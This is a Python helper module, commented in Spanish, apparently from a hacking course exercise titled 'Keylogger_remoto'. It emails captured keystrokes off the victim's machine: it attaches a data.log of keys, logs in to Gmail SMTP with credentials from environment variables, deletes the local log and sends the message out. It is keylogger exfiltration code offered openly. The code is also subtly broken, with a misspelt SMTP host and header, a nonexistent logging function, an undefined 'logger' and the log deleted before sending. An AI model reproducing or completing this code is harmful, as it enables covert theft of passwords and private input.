'''
Archivo de apoyo para HP-13.- Keylogger_remoto.py
En este archivo se configura el envío por email de los eventos capturados del teclado.

Para más info:
    - smtplib: https://docs.python.org/es/3/library/smtplib.html
    - os: https://docs.python.org/es/3.10/library/os.html
    - loggin: https://docs.python.org/es/3/library/logging.html
    - email MIME (Multipurpose Internet Mail Extensions): https://docs.python.org/es/3/library/email.mime.html
    - email: https://docs.python.org/3/library/email.html#module-email

OBJETOS MIMEBase
Constructor
    - type: tipo de contenido del mensaje MIME
    - subtype: subtipo de contenido del mensaje MIME
Atributos
    · _type: El tipo de contenido del mensaje MIME.
    · _subtype: El subtipo del contenido del mensaje MIME.
    · _payload: El contenido del mensaje MIME.
    · _encoders: Una lista de codificadores que se utilizan para codificar el contenido del mensaje MIME.
    · _decoders: Una lista de decodificadores que se utilizan para decodificar el contenido del mensaje MIME.
'''

# IMPORTS ---------------------------------------------------------------------------------------------
import smtplib
# definición de objetos de sesión cliente SMTP - envío emails a cualquier máquina que posea un daemon SMTP o ESMTP
from os import * # módulo para usar funcionalidades del sistema operativo
#import logger # módulo para utilización de funcionalidades de logging de eventos
import logging
# Exclusivo para email: creación de estructura para email, con toda la información necesaría para que esté correcto
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase

from email import encoders

# FUNCTIONS --------------------------------------------------------------------------------------------
def send_email():
    # Configuración de MIME -------------------------------------
    message = MIMEMultipart()
    message['From'] = environ['EMAIL_FROM'] # environ: añadiendo variable de entorno
    message['To'] = environ['EMAIL_TO']
    message['Subject'] = f'Keys from {environ["COMPUTERNAME"]}'
    password = environ['PASSWORD']

    # Configuración de mensaje ----------------------------------
    message.attach(MIMEText(f'{message["Subject"]} está localizado en este fichero: ', 'plain'))
    # Añadir el mensaje y el tipo de mensaje al campo "Asunto" del email
    payload = MIMEBase('application', 'octate-stream') # se adjunta el archivo
    payload.set_payload(logging.get_keys_rb()) # disponible en archivo principal
    #payload.set_payload(logger.get_keys_rb())

    encoders.encode_base64(payload) # codifica la información para enviarla por email
    payload.add_header('Content_Decomposition','attachment', filename='data.log') # info para añadir fichero
    message.attach(payload) # carga real del archivo a enviar

    # Configuración del envío por email ------------------------
    server = smtplib.SMTP('stmp.gmail.com', 587) # conexión
    server.ehlo() # autenticación y cifrado TLS, pide al server las extensiones disponibles
    server.starttls() # inicialización de TLS
    server.ehlo() # comprobación de inicialización TLS correcta
    server.login(message['From'], password) # se le da el usuario y el pass recogidos desde el entorno

    remove('data.log')

    msg = message.as_string() # cuerpo del mensaje como string
    server.sendmail(message['From'], message['To'], msg)

    server.quit() # cierre conexión con email server
    logger.main()